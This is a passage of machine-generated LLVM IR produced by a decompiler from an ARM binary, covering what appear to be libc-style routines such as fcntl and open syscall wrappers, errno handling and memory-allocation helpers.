dec_label_pc_12f14:                               ; preds = %dec_label_pc_12f00, %dec_label_pc_12ee4
  store i32 77600, i32* @lr, align 4
  %v1_12f1c = call i32 @function_1972c()
  store i32 %v1_12f1c, i32* @r0, align 4
  %v1_12f28 = call i32 @function_17228()
  %v0_12f2c = load i32, i32* %r6.global-to-local, align 4
  %v1_12f30 = call i32 @function_15f40(i32 %v0_12f2c)
  ret i32 %v1_12f30

; uselistorder directives
  uselistorder i32 %v1_12f00, { 0, 2, 1 }
  uselistorder i32 139964, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_12f00, { 1, 0 }
}

define i32 @function_12f48(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12f48:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg4, i32* @r2, align 4
  ret i32 %arg2
}

define i32 @function_12f68(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12f68:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %v3_12f6c = load i32, i32* @r4, align 4
  %v15_12f6c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v7_12f7c = icmp eq i32 %arg2, 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  br i1 %v7_12f7c, label %bb, label %dec_label_pc_12f94

bb:                                               ; preds = %dec_label_pc_12f68
  %v2_12f8c = or i32 %arg3, 131072
  store i32 %v2_12f8c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_130b4

dec_label_pc_12f94:                               ; preds = %dec_label_pc_12f68
  %v7_12f94 = icmp eq i32 %arg2, 14
  br i1 %v7_12f94, label %dec_label_pc_12f9c, label %dec_label_pc_12fc4

dec_label_pc_12f9c:                               ; preds = %dec_label_pc_12f94
  store i32 %arg1, i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  store i32 %arg3, i32* @r3, align 4
  %v3_12fbc = call i32 @function_15754(i32 221, i32 %arg1, i32 14)
  store i32 %v3_12fbc, i32* @r0, align 4
  br label %dec_label_pc_130c8

dec_label_pc_12fc4:                               ; preds = %dec_label_pc_12f94
  %v7_12fc4 = icmp eq i32 %arg2, 9
  br i1 %v7_12fc4, label %dec_label_pc_12fcc, label %dec_label_pc_1301c

dec_label_pc_12fcc:                               ; preds = %dec_label_pc_12fc4
  %v2_12fd8 = ptrtoint i32* %stack_var_-44 to i32
  %v4_12fdc = call i32 @function_12f48(i32 221, i32 %arg1, i32 16, i32 %v2_12fd8)
  store i32 %v4_12fdc, i32* @r0, align 4
  %v4_12fe4 = icmp eq i32 %v4_12fdc, -22
  br i1 %v4_12fe4, label %dec_label_pc_12fe8, label %dec_label_pc_13000

dec_label_pc_12fe8:                               ; preds = %dec_label_pc_12fcc
  %v0_12fe8 = load i32, i32* %r7.global-to-local, align 4
  %v0_12fec = load i32, i32* %r6.global-to-local, align 4
  %v0_12ff0 = load i32, i32* %r5.global-to-local, align 4
  %v4_12ff8 = call i32 @function_12f48(i32 221, i32 %v0_12fe8, i32 %v0_12fec, i32 %v0_12ff0)
  br label %dec_label_pc_130cc

dec_label_pc_13000:                               ; preds = %dec_label_pc_12fcc
  %v2_13000 = icmp eq i32 %v4_12fdc, 0
  br i1 %v2_13000, label %dec_label_pc_13008, label %dec_label_pc_130c8

dec_label_pc_13008:                               ; preds = %dec_label_pc_13000
  %v3_13008 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_13008, i32* @r3, align 4
  %v7_13010 = icmp eq i32 %v3_13008, 2
  br i1 %v7_13010, label %bb21, label %dec_label_pc_130cc

bb21:                                             ; preds = %dec_label_pc_13008
  %v2_13014 = sub i32 0, %tmp
  br label %dec_label_pc_130cc

dec_label_pc_1301c:                               ; preds = %dec_label_pc_12fc4
  %v9_13020 = icmp eq i32 %arg2, 1030
  br i1 %v9_13020, label %dec_label_pc_13028, label %dec_label_pc_130b4

dec_label_pc_13028:                               ; preds = %dec_label_pc_1301c
  %v4_13038 = call i32 @function_12f48(i32 221, i32 %arg1, i32 1030, i32 %arg3)
  %v7_1303c = icmp eq i32 %v4_13038, -22
  store i32 %v4_13038, i32* @r4, align 4
  br i1 %v7_1303c, label %dec_label_pc_13050, label %dec_label_pc_13098

dec_label_pc_13050:                               ; preds = %dec_label_pc_13028
  %v0_13050 = load i32, i32* %r6.global-to-local, align 4
  %v0_13058 = load i32, i32* %r7.global-to-local, align 4
  %v4_13060 = call i32 @function_12f48(i32 221, i32 %v0_13058, i32 %v0_13050, i32 0)
  %v7_13064 = icmp eq i32 %v4_13060, -22
  br i1 %v7_13064, label %dec_label_pc_13080, label %dec_label_pc_1306c

dec_label_pc_1306c:                               ; preds = %dec_label_pc_13050
  %v1_1306c = icmp slt i32 %v4_13060, 0
  br i1 %v1_1306c, label %dec_label_pc_130ac, label %dec_label_pc_13074

dec_label_pc_13074:                               ; preds = %dec_label_pc_1306c
  store i32 6, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_130ac

dec_label_pc_13080:                               ; preds = %dec_label_pc_13050
  %v0_13080 = load i32, i32* %r7.global-to-local, align 4
  %v0_13084 = load i32, i32* %r5.global-to-local, align 4
  %v4_13090 = call i32 @function_12f48(i32 221, i32 %v0_13080, i32 0, i32 %v0_13084)
  store i32 %v4_13090, i32* @r4, align 4
  br label %dec_label_pc_13098

dec_label_pc_13098:                               ; preds = %dec_label_pc_13028, %dec_label_pc_13080
  %v3_1309c = phi i32 [ %v4_13090, %dec_label_pc_13080 ], [ %v4_13038, %dec_label_pc_13028 ]
  %storemerge1 = icmp slt i32 %v3_1309c, 0
  br i1 %storemerge1, label %.thread6, label %bb23

bb23:                                             ; preds = %dec_label_pc_13098
  store i32 2, i32* @r2, align 4
  store i32 1, i32* @r3, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13098, %bb23
  %v3_130a8 = xor i1 %storemerge1, true
  call void @__pseudo_cond_branch(i1 %v3_130a8, i32 ptrtoint (i32* @global_var_12f48.555 to i32))
  br label %dec_label_pc_130ac

dec_label_pc_130ac:                               ; preds = %dec_label_pc_1306c, %dec_label_pc_13074, %.thread6
  %v0_130ac = load i32, i32* @r4, align 4
  store i32 %v0_130ac, i32* @r0, align 4
  br label %dec_label_pc_130c8

dec_label_pc_130b4:                               ; preds = %bb, %dec_label_pc_1301c
  %v0_130bc = phi i32 [ %arg3, %dec_label_pc_1301c ], [ %v2_12f8c, %bb ]
  %v4_130c4 = call i32 @function_12f48(i32 221, i32 %arg1, i32 %arg2, i32 %v0_130bc)
  store i32 %v4_130c4, i32* @r0, align 4
  br label %dec_label_pc_130c8

dec_label_pc_130c8:                               ; preds = %dec_label_pc_13000, %dec_label_pc_130ac, %dec_label_pc_12f9c, %dec_label_pc_130b4
  %v0_130c8 = call i32 @function_13178()
  br label %dec_label_pc_130cc

dec_label_pc_130cc:                               ; preds = %bb21, %dec_label_pc_13008, %dec_label_pc_12fe8, %dec_label_pc_130c8
  %v1_130d8 = phi i32 [ %v2_13014, %bb21 ], [ %tmp, %dec_label_pc_13008 ], [ %v4_12ff8, %dec_label_pc_12fe8 ], [ %v0_130c8, %dec_label_pc_130c8 ]
  store i32 %v3_12f6c, i32* @r4, align 4
  store i32 %v15_12f6c, i32* @lr, align 4
  ret i32 %v1_130d8

; uselistorder directives
  uselistorder i32 %v4_13060, { 1, 0 }
  uselistorder i32 %v4_13038, { 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @function_12f48, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg1, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_130cc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_130c8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_130b4, { 1, 0 }
  uselistorder label %dec_label_pc_130ac, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_13098, { 1, 0 }
}

define i32 @function_130e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_130e0:
  %r7.global-to-local = alloca i32, align 4
  %v6_130e0 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v1_130f0 = and i32 %arg2, 64
  %v2_130f0 = icmp eq i32 %v1_130f0, 0
  br i1 %v2_130f0, label %dec_label_pc_130f8, label %dec_label_pc_13110

dec_label_pc_130f8:                               ; preds = %dec_label_pc_130e0
  %v2_13100 = and i32 %arg2, 4210688
  %v3_13104 = icmp eq i32 %v2_13100, 4210688
  br i1 %v3_13104, label %dec_label_pc_13110, label %dec_label_pc_1311c

dec_label_pc_13110:                               ; preds = %dec_label_pc_130f8, %dec_label_pc_130e0
  br label %dec_label_pc_1311c

dec_label_pc_1311c:                               ; preds = %dec_label_pc_130f8, %dec_label_pc_13110
  %storemerge = phi i32 [ %v6_130e0, %dec_label_pc_13110 ], [ 0, %dec_label_pc_130f8 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_13124 = or i32 %arg2, 131072
  store i32 %v1_13124, i32* @r2, align 4
  %v3_13138 = call i32 @function_15754(i32 5, i32 %arg1, i32 %v1_13124)
  %v1_1313c = icmp slt i32 %v3_13138, 0
  br i1 %v1_1313c, label %dec_label_pc_1315c, label %dec_label_pc_13144

dec_label_pc_13144:                               ; preds = %dec_label_pc_1311c
  %v0_13144 = load i32, i32* %r7.global-to-local, align 4
  %v1_13144 = and i32 %v0_13144, 524288
  %v2_13144 = icmp eq i32 %v1_13144, 0
  br i1 %v2_13144, label %dec_label_pc_1315c, label %dec_label_pc_1314c

dec_label_pc_1314c:                               ; preds = %dec_label_pc_13144
  store i32 221, i32* %r7.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  br label %dec_label_pc_1315c

dec_label_pc_1315c:                               ; preds = %dec_label_pc_1314c, %dec_label_pc_13144, %dec_label_pc_1311c
  store i32 %v3_13138, i32* @r0, align 4
  %v0_13160 = call i32 @function_13178()
  ret i32 %v0_13160

; uselistorder directives
  uselistorder i32 221, { 7, 3, 4, 2, 1, 5, 0, 6 }
  uselistorder i32 64, { 10, 28, 3, 4, 11, 5, 12, 13, 6, 14, 7, 15, 16, 8, 17, 18, 9, 19, 20, 0, 21, 23, 22, 1, 24, 26, 25, 2, 27 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1311c, { 1, 0 }
}

define i32 @function_13178() local_unnamed_addr {
dec_label_pc_13178:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_13178 = load i32, i32* @r0, align 4
  %v2_13178 = icmp ugt i32 %v0_13178, -4097
  %v7_13178 = icmp eq i32 %v0_13178, -4096
  %v3_1317c = load i32, i32* @r4, align 4
  store i32 %v3_1317c, i32* %stack_var_-8, align 4
  %v2_13180 = xor i1 %v2_13178, true
  %v3_13180 = or i1 %v7_13178, %v2_13180
  br i1 %v3_13180, label %bb, label %bb4

bb:                                               ; preds = %dec_label_pc_13178
  store i32 %v0_13178, i32* @r2, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_13178, %bb
  store i32 %v0_13178, i32* %r4.global-to-local, align 4
  %v2_13188 = xor i1 %v7_13178, true
  %v3_13188 = and i1 %v2_13178, %v2_13188
  br i1 %v3_13188, label %dec_label_pc_13198, label %dec_label_pc_1318c

dec_label_pc_1318c:                               ; preds = %bb4, %dec_label_pc_13198
  %v2_13190 = phi i32 [ %v3_1317c, %bb4 ], [ %v2_13190.pre, %dec_label_pc_13198 ]
  %v0_1318c = load i32, i32* @r2, align 4
  store i32 %v2_13190, i32* @r4, align 4
  ret i32 %v0_1318c

dec_label_pc_13198:                               ; preds = %bb4
  %v0_13198 = call i32 @function_12ecc()
  %v0_1319c = load i32, i32* %r4.global-to-local, align 4
  %v1_1319c = sub i32 0, %v0_1319c
  store i32 %v1_1319c, i32* @r3, align 4
  store i32 -1, i32* @r2, align 4
  %v2_131a4 = inttoptr i32 %v0_13198 to i32*
  store i32 %v1_1319c, i32* %v2_131a4, align 4
  %v2_13190.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1318c

; uselistorder directives
  uselistorder i1 %v7_13178, { 1, 0 }
  uselistorder i1 %v2_13178, { 1, 0 }
  uselistorder i32 %v0_13178, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1318c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_131ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_131cc.dec_label_pc_131cc_crit_edge.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  %v3_131b0 = load i32, i32* @r4, align 4
  %v2_131b8 = ptrtoint i32* %stack_var_-12 to i32
  %v2_131c8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_131c8, i32* %ip.global-to-local, align 4
  %v4_131cc20 = add i32 %v2_131b8, 4
  store i32 %v4_131cc20, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge

dec_label_pc_131cc.dec_label_pc_131cc_crit_edge:  ; preds = %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge.dec_label_pc_131cc.dec_label_pc_131cc_crit_edge_crit_edge, %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge.lr.ph
  %v2_131d0.pre = phi i32 [ %v2_131c8, %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge.lr.ph ], [ %v2_131d0.pre.pre, %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge.dec_label_pc_131cc.dec_label_pc_131cc_crit_edge_crit_edge ]
  %v0_131cc.pre = phi i32 [ %v4_131cc20, %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge.lr.ph ], [ %v0_131cc.pre.pre, %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge.dec_label_pc_131cc.dec_label_pc_131cc_crit_edge_crit_edge ]
  %v1_131d425 = phi i32 [ 4, %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge.lr.ph ], [ %v1_131d4, %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge.dec_label_pc_131cc.dec_label_pc_131cc_crit_edge_crit_edge ]
  %v1_131cc = inttoptr i32 %v0_131cc.pre to i32*
  %v2_131cc = load i32, i32* %v1_131cc, align 4
  %v4_131cc = add i32 %v0_131cc.pre, 4
  store i32 %v4_131cc, i32* %r0.global-to-local, align 4
  %v3_131d0 = add i32 %v1_131d425, %v2_131d0.pre
  %v4_131d0 = inttoptr i32 %v3_131d0 to i32*
  store i32 %v2_131cc, i32* %v4_131d0, align 4
  %v0_131d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_131d4 = add i32 %v0_131d4, 4
  store i32 %v1_131d4, i32* %r2.global-to-local, align 4
  %v7_131d8 = icmp eq i32 %v1_131d4, 16
  br i1 %v7_131d8, label %dec_label_pc_131e0, label %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge.dec_label_pc_131cc.dec_label_pc_131cc_crit_edge_crit_edge

dec_label_pc_131cc.dec_label_pc_131cc_crit_edge.dec_label_pc_131cc.dec_label_pc_131cc_crit_edge_crit_edge: ; preds = %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge
  %v0_131cc.pre.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_131d0.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge

dec_label_pc_131e0:                               ; preds = %dec_label_pc_131cc.dec_label_pc_131cc_crit_edge
  store i32 %arg1, i32* @r0, align 4
  %v0_131f8 = call i32 @function_13178()
  store i32 %v0_131f8, i32* %r0.global-to-local, align 4
  store i32 %v3_131b0, i32* @r4, align 4
  ret i32 %v0_131f8

; uselistorder directives
  uselistorder i32 %v1_131d4, { 1, 2, 0 }
  uselistorder i32 %v0_131cc.pre, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 0 }
}

define i32 @function_1320c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1320c:
  store i32 %arg2, i32* @r1, align 4
  %v3_1320c = load i32, i32* @r4, align 4
  %v6_1320c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_13210 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  br i1 %v2_13210, label %dec_label_pc_13230, label %dec_label_pc_13220

dec_label_pc_13220:                               ; preds = %dec_label_pc_1320c
  store i32 -1, i32* @r0, align 4
  %v0_13224 = call i32 @function_12920()
  %v1_13228 = load i32, i32* @r4, align 4
  %v3_13228 = icmp ult i32 %v0_13224, %v1_13228
  br i1 %v3_13228, label %dec_label_pc_1324c, label %dec_label_pc_13220.dec_label_pc_13230_crit_edge

dec_label_pc_13220.dec_label_pc_13230_crit_edge:  ; preds = %dec_label_pc_13220
  %v1_13230.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13230

dec_label_pc_13230:                               ; preds = %dec_label_pc_13220.dec_label_pc_13230_crit_edge, %dec_label_pc_1320c
  %v1_13230 = phi i32 [ %v1_13230.pre, %dec_label_pc_13220.dec_label_pc_13230_crit_edge ], [ 0, %dec_label_pc_1320c ]
  %v0_13230 = phi i32 [ %v1_13228, %dec_label_pc_13220.dec_label_pc_13230_crit_edge ], [ %arg1, %dec_label_pc_1320c ]
  %v2_13230 = mul i32 %v0_13230, %v1_13230
  %v1_13234 = call i32 @function_14374(i32 %v2_13230)
  store i32 %v1_13234, i32* @r2, align 4
  br label %dec_label_pc_1323c

dec_label_pc_1323c:                               ; preds = %dec_label_pc_1324c, %dec_label_pc_13230
  %v0_1323c = phi i32 [ %v0_1323c.pre, %dec_label_pc_1324c ], [ %v1_13234, %dec_label_pc_13230 ]
  store i32 %v3_1320c, i32* @r4, align 4
  store i32 %v6_1320c, i32* @r5, align 4
  ret i32 %v0_1323c

dec_label_pc_1324c:                               ; preds = %dec_label_pc_13220
  %v0_1324c = call i32 @function_12ecc()
  store i32 0, i32* @r2, align 4
  %v2_13258 = inttoptr i32 %v0_1324c to i32*
  store i32 12, i32* %v2_13258, align 4
  %v0_1323c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1323c
}

define i32 @function_13260(i32* %arg1) local_unnamed_addr {
dec_label_pc_13260:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_13260 = load i32, i32* @r4, align 4
  store i32 %v3_13260, i32* %stack_var_-36, align 4
  %v6_13260 = load i32, i32* @r5, align 4
  %v9_13260 = load i32, i32* @r6, align 4
  %v12_13260 = load i32, i32* @r7, align 4
  %v15_13260 = load i32, i32* @r8, align 4
  %v21_13260 = load i32, i32* @sl, align 4
  %v2_13264 = load i32, i32* %arg1, align 4
  store i32 %v2_13264, i32* @sl, align 4
  %v1_13268 = urem i32 %v2_13264, 2
  %v2_13268 = icmp eq i32 %v1_13268, 0
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v2_13268, label %dec_label_pc_13278, label %dec_label_pc_13354

dec_label_pc_13278:                               ; preds = %dec_label_pc_13260, %dec_label_pc_13348
  %v0_13278 = phi i32 [ %v0_13348, %dec_label_pc_13348 ], [ %v2_13264, %dec_label_pc_13260 ]
  %v3_13278 = udiv i32 %v0_13278, 16
  store i32 %v3_13278, i32* %r3.global-to-local, align 4
  %v1_1327c = add nsw i32 %v3_13278, -1
  store i32 %v1_1327c, i32* @r0, align 4
  %tmp39 = icmp ult i32 %v1_1327c, 33
  br i1 %tmp39, label %.thread, label %dec_label_pc_1328c

.thread:                                          ; preds = %dec_label_pc_13278
  store i32 %v1_1327c, i32* @r8, align 4
  br label %dec_label_pc_132a4

dec_label_pc_1328c:                               ; preds = %dec_label_pc_13278
  %tmp40 = icmp ugt i32 %v1_1327c, 7168
  br i1 %tmp40, label %.thread18, label %dec_label_pc_13298

.thread18:                                        ; preds = %dec_label_pc_1328c
  store i32 63, i32* @r8, align 4
  br label %dec_label_pc_132a4

dec_label_pc_13298:                               ; preds = %dec_label_pc_1328c
  %v0_13298 = call i32 @function_17570()
  %v3_1329c = udiv i32 %v0_13298, 2097152
  %v1_132a0 = add nsw i32 %v3_1329c, -496
  store i32 %v1_132a0, i32* @r8, align 4
  br label %dec_label_pc_132a4

dec_label_pc_132a4:                               ; preds = %.thread18, %.thread, %dec_label_pc_13298
  %v0_132ac = phi i32 [ 63, %.thread18 ], [ %v1_1327c, %.thread ], [ %v1_132a0, %dec_label_pc_13298 ]
  %v3_132a8 = load i32, i32* @global_var_22ae8.558, align 4
  store i32 %v3_132a8, i32* %r2.global-to-local, align 4
  %v3_132ac = mul i32 %v0_132ac, 16
  store i32 %v3_132ac, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %sb.global-to-local, align 4
  %v2_132b4 = icmp eq i32 %v3_132a8, 0
  store i1 %v2_132b4, i1* @cpsr_z, align 1
  %v1_132b8 = or i32 %v3_132ac, 8
  store i32 %v1_132b8, i32* %r3.global-to-local, align 4
  %v2_132bc = add i32 %v1_132b8, ptrtoint (i32* @global_var_223b8.560 to i32)
  store i32 %v2_132bc, i32* @r6, align 4
  br i1 %v2_132b4, label %bb, label %dec_label_pc_13384

bb:                                               ; preds = %dec_label_pc_132a4
  %v1_132c0 = load i32, i32* @sl, align 4
  store i32 %v1_132c0, i32* @r0, align 4
  br label %dec_label_pc_132c8

dec_label_pc_132c8:                               ; preds = %bb, %dec_label_pc_133c0
  %v0_132ec38 = phi i32 [ %v1_132c0, %bb ], [ %v2_133c0, %dec_label_pc_133c0 ]
  %v0_132cc = phi i32 [ ptrtoint (i32* @global_var_223b8.560 to i32), %bb ], [ %v0_132cc.pre, %dec_label_pc_133c0 ]
  %v0_132c8 = phi i32 [ %v0_132ac, %bb ], [ %v0_132c8.pre, %dec_label_pc_133c0 ]
  %v1_132c8 = add i32 %v0_132c8, 1
  store i32 %v1_132c8, i32* %r1.global-to-local, align 4
  %v4_132cc = mul i32 %v1_132c8, 16
  %v5_132cc = add i32 %v4_132cc, %v0_132cc
  %v6_132cc = inttoptr i32 %v5_132cc to i32*
  %v7_132cc = load i32, i32* %v6_132cc, align 4
  store i32 %v7_132cc, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* @r6, align 4
  %v2_132d4 = icmp eq i32 %v7_132cc, 0
  br i1 %v2_132d4, label %bb31, label %.thread4

bb31:                                             ; preds = %dec_label_pc_132c8
  %v4_132d8 = mul i32 %v1_132c8, 16
  %v3_132dc = add i32 %v4_132d8, ptrtoint (i32* @global_var_223b8.560 to i32)
  store i32 %v3_132dc, i32* %r3.global-to-local, align 4
  %v2_132e0 = add i32 %v4_132d8, add (i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32 -8)
  store i32 %v2_132e0, i32* %r2.global-to-local, align 4
  %v7_132e4 = add i32 %v4_132cc, ptrtoint (i32* @global_var_223b8.560 to i32)
  %v8_132e4 = inttoptr i32 %v7_132e4 to i32*
  store i32 %v2_132e0, i32* %v8_132e4, align 4
  %v1_132e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_132e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_132e8 = add i32 %v2_132e8, 4
  %v4_132e8 = inttoptr i32 %v3_132e8 to i32*
  store i32 %v1_132e8, i32* %v4_132e8, align 4
  %v0_132ec.pre = load i32, i32* @r0, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_132c8, %bb31
  %v0_132ec = phi i32 [ %v0_132ec38, %dec_label_pc_132c8 ], [ %v0_132ec.pre, %bb31 ]
  %v1_132ec = load i32, i32* @sl, align 4
  %v9_132ec = icmp eq i32 %v0_132ec, %v1_132ec
  br i1 %v9_132ec, label %dec_label_pc_133c8, label %dec_label_pc_132f4

dec_label_pc_132f4:                               ; preds = %.thread4
  %v0_132f4 = load i32, i32* @r5, align 4
  %v1_132f4 = add i32 %v0_132f4, 8
  store i32 %v1_132f4, i32* %r2.global-to-local, align 4
  %v1_132f8 = load i32, i32* @r6, align 4
  %v2_132f8 = add i32 %v1_132f8, %v1_132f4
  %v3_132f8 = inttoptr i32 %v2_132f8 to i32*
  %v4_132f8 = load i32, i32* %v3_132f8, align 4
  store i32 %v4_132f8, i32* %r3.global-to-local, align 4
  %v2_132fc = icmp eq i32 %v4_132f8, 0
  store i1 %v2_132fc, i1* @cpsr_z, align 1
  store i32 %v2_132f8, i32* %r4.global-to-local, align 4
  br i1 %v2_132fc, label %dec_label_pc_13348, label %dec_label_pc_13308

dec_label_pc_13308:                               ; preds = %dec_label_pc_132f4
  %v0_13308 = call i32 @function_15c98()
  store i32 %v0_13308, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13310 = load i32, i32* %r2.global-to-local, align 4
  %v2_13310 = load i32, i32* @r6, align 4
  %v3_13310 = add i32 %v2_13310, %v1_13310
  %v4_13310 = inttoptr i32 %v3_13310 to i32*
  store i32 0, i32* %v4_13310, align 4
  %v0_13314 = call i32 @function_15c98()
  %v0_13318 = load i32, i32* @r5, align 4
  %v1_13318 = add i32 %v0_13318, 12
  store i32 %v1_13318, i32* %r3.global-to-local, align 4
  %v1_1331c = load i32, i32* @r6, align 4
  %v2_1331c = add i32 %v1_1331c, %v1_13318
  %v3_1331c = inttoptr i32 %v2_1331c to i32*
  %v4_1331c = load i32, i32* %v3_1331c, align 4
  store i32 %v4_1331c, i32* %r2.global-to-local, align 4
  %v2_13320 = icmp eq i32 %v4_1331c, 0
  br i1 %v2_13320, label %dec_label_pc_13344, label %dec_label_pc_13328

dec_label_pc_13328:                               ; preds = %dec_label_pc_13308
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_1332c = load i32, i32* %r4.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_1333c = icmp eq i32 %v0_1332c, -38
  br i1 %v7_1333c, label %dec_label_pc_133ac, label %dec_label_pc_13344

dec_label_pc_13344:                               ; preds = %dec_label_pc_13328, %dec_label_pc_13308
  %v0_13344 = load i32, i32* %fp.global-to-local, align 4
  %v1_13344 = inttoptr i32 %v0_13344 to i32*
  %v2_13344 = load i32, i32* %v1_13344, align 4
  br label %dec_label_pc_13348

dec_label_pc_13348:                               ; preds = %dec_label_pc_132f4, %dec_label_pc_133ac, %dec_label_pc_13344
  %v0_13348 = phi i32 [ %v0_132ec, %dec_label_pc_132f4 ], [ %v2_133b8, %dec_label_pc_133ac ], [ %v2_13344, %dec_label_pc_13344 ]
  store i32 %v0_13348, i32* @sl, align 4
  %v1_1334c = urem i32 %v0_13348, 2
  %v2_1334c = icmp eq i32 %v1_1334c, 0
  br i1 %v2_1334c, label %dec_label_pc_13278, label %dec_label_pc_13354

dec_label_pc_13354:                               ; preds = %dec_label_pc_13348, %dec_label_pc_13260
  br label %dec_label_pc_13358

dec_label_pc_13358:                               ; preds = %dec_label_pc_13464, %dec_label_pc_1345c, %dec_label_pc_13354
  %v1_13360 = phi i32 [ 1, %dec_label_pc_13464 ], [ 1, %dec_label_pc_1345c ], [ 0, %dec_label_pc_13354 ]
  %v2_1335c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1335c, i32* @r4, align 4
  store i32 %v6_13260, i32* @r5, align 4
  store i32 %v9_13260, i32* @r6, align 4
  store i32 %v12_13260, i32* @r7, align 4
  store i32 %v15_13260, i32* @r8, align 4
  store i32 %v21_13260, i32* @sl, align 4
  ret i32 %v1_13360

dec_label_pc_1336c:                               ; preds = %dec_label_pc_133a8
  %v0_1336c = load i32, i32* @r5, align 4
  %v1_1336c = add i32 %v0_1336c, 12
  store i32 1, i32* @r2, align 4
  %v1_13374 = load i32, i32* %sb.global-to-local, align 4
  %v2_13374 = add i32 %v1_1336c, %v1_13374
  store i32 %v2_13374, i32* %r1.global-to-local, align 4
  %v0_13378 = load i32, i32* @r6, align 4
  store i32 1, i32* @r3, align 4
  %v2_13380 = inttoptr i32 %v0_13378 to i32*
  %v3_13380 = call i32 @function_15818(i32* %v2_13380, i32 %v2_13374)
  %v0_13384.pre = load i32, i32* @r5, align 4
  %v1_13388.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13384

dec_label_pc_13384:                               ; preds = %dec_label_pc_132a4, %dec_label_pc_1336c
